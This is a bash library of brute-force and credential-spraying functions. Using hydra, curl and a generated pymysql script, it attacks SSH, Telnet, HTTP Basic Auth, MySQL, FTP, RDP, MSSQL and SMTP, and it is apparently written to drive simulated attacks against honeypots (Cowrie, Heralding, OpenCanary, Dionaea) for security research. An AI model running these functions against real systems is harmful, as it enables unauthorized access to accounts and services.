#!/bin/bash
# lib/tactics_brute.sh - 브루트포스 / 자격증명 스터핑 전술 함수

_make_wordlist() {
    # PASS_POOL에서 랜덤 N개 선택해 임시 파일 생성
    local n=${1:-20}
    local tmpfile="/tmp/wl_$$.txt"
    printf '%s\n' "${PASS_POOL[@]}" | shuf | head -n "$n" > "$tmpfile"
    echo "$tmpfile"
}

_make_userlist() {
    local n=${1:-10}
    local tmpfile="/tmp/ul_$$.txt"
    printf '%s\n' "${USER_POOL[@]}" | shuf | head -n "$n" > "$tmpfile"
    echo "$tmpfile"
}

tactic_ssh_brute_single() {
    local user
    user=$(rand_pick "${USER_POOL[@]}")
    local wl
    wl=$(_make_wordlist "$(rand_int 15 40)")
    local threads=$(rand_int 2 6)
    hydra -l "$user" -P "$wl" -t "$threads" -f \
        -o "/honeypot_logs/hydra_ssh_${user}_$$.txt" \
        ssh://${COWRIE_IP}:2222 -e nsr 2>/dev/null || true
    rm -f "$wl"
}

tactic_ssh_brute_multi() {
    local ul
    ul=$(_make_userlist "$(rand_int 5 12)")
    local wl
    wl=$(_make_wordlist "$(rand_int 20 50)")
    local threads=$(rand_int 2 4)
    hydra -L "$ul" -P "$wl" -t "$threads" \
        -o "/honeypot_logs/hydra_ssh_multi_$$.txt" \
        ssh://${COWRIE_IP}:2222 -e nsr 2>/dev/null || true
    rm -f "$ul" "$wl"
}

tactic_ssh_brute_targeted() {
    # 특정 알려진 계정 집중 공격
    local targets=("root" "admin" "pi" "ubuntu" "vagrant" "ec2-user")
    local user
    user=$(rand_pick "${targets[@]}")
    local wl
    wl=$(_make_wordlist "$(rand_int 30 60)")
    hydra -l "$user" -P "$wl" -t 4 -f \
        ssh://${COWRIE_IP}:2222 -e nsr 2>/dev/null || true
    rm -f "$wl"
}

tactic_telnet_brute() {
    local user
    user=$(rand_pick "${USER_POOL[@]}")
    local wl
    wl=$(_make_wordlist "$(rand_int 10 25)")
    hydra -l "$user" -P "$wl" -t 4 -f \
        telnet://${COWRIE_IP}:2223 2>/dev/null || true
    rm -f "$wl"
}

tactic_http_brute() {
    # heralding HTTP uses Basic Auth — POST is not supported (returns 501)
    local user
    user=$(rand_pick "admin" "administrator" "root" "user" "guest")
    local n=$(rand_int 20 40)
    local wl
    wl=$(_make_wordlist "$n")
    while IFS= read -r pass; do
        curl -s --max-time 3 -u "${user}:${pass}" \
            "http://${HERALDING_IP}/" -o /dev/null 2>/dev/null || true
    done < "$wl"
    rm -f "$wl"
}

tactic_mysql_brute() {
    # hydra sends COM_QUIT without credentials — use pymysql directly
    local user
    user=$(rand_pick "root" "admin" "mysql" "dba" "dbuser")
    local n=$(rand_int 15 35)
    local wl
    wl=$(_make_wordlist "$n")
    local pyfile="/tmp/mysqlbrute_$$.py"
    cat > "$pyfile" <<PYEOF
import pymysql, time, random
passwords = open('$wl').read().splitlines()
for pwd in passwords:
    try:
        pymysql.connect(host='$HERALDING_IP', port=3306,
                        user='$user', password=pwd, connect_timeout=2)
    except Exception:
        pass
    time.sleep(random.uniform(0.05, 0.15))
PYEOF
    python3 "$pyfile" 2>/dev/null || true
    rm -f "$wl" "$pyfile"
}

tactic_ftp_brute() {
    local target
    target=$(rand_pick "$OPENCANARY_IP" "$DIONAEA_IP")
    local user
    user=$(rand_pick "${USER_POOL[@]}")
    local wl
    wl=$(_make_wordlist "$(rand_int 15 30)")
    hydra -l "$user" -P "$wl" -t 4 -f \
        -o "/honeypot_logs/hydra_ftp_$$.txt" \
        ftp://${target} 2>/dev/null || true
    rm -f "$wl"
}

tactic_rdp_brute() {
    local user
    user=$(rand_pick "administrator" "admin" "user" "guest" "rdpuser")
    local wl
    wl=$(_make_wordlist "$(rand_int 15 30)")
    hydra -l "$user" -P "$wl" -t 4 \
        -o "/honeypot_logs/hydra_rdp_$$.txt" \
        rdp://${OPENCANARY_IP} 2>/dev/null || true
    rm -f "$wl"
}

tactic_mssql_brute() {
    local user
    user=$(rand_pick "sa" "admin" "dbo" "mssql")
    local wl
    wl=$(_make_wordlist "$(rand_int 15 30)")
    hydra -l "$user" -P "$wl" -t 4 \
        mssql://${DIONAEA_IP} 2>/dev/null || true
    rm -f "$wl"
}

tactic_smtp_brute() {
    local user
    user=$(rand_pick "admin" "mail" "postmaster" "root" "support")
    local wl
    wl=$(_make_wordlist "$(rand_int 20 40)")
    hydra -l "$user" -P "$wl" -t 4 -f \
        -o "/honeypot_logs/hydra_smtp_$$.txt" \
        smtp://${MAILONEY_IP}:25 2>/dev/null || true
    rm -f "$wl"
}

tactic_credential_spray() {
    # 여러 서비스에 동일 자격증명 뿌리기 (credential spraying)
    local user
    user=$(rand_pick "${USER_POOL[@]}")
    local pass
    pass=$(rand_pick "${PASS_POOL[@]}")
    # SSH
    hydra -l "$user" -p "$pass" -t 2 "ssh://${COWRIE_IP}:2222" 2>/dev/null || true
    # FTP
    hydra -l "$user" -p "$pass" -t 2 "ftp://${OPENCANARY_IP}" 2>/dev/null || true
    # HTTP Basic Auth (heralding)
    curl -s --max-time 3 -u "${user}:${pass}" \
        "http://${HERALDING_IP}/" -o /dev/null 2>/dev/null || true
    # MySQL via pymysql
    python3 -c "
import pymysql
try:
    pymysql.connect(host='${HERALDING_IP}', port=3306,
                    user='${user}', password='${pass}', connect_timeout=2)
except Exception:
    pass
" 2>/dev/null || true
}
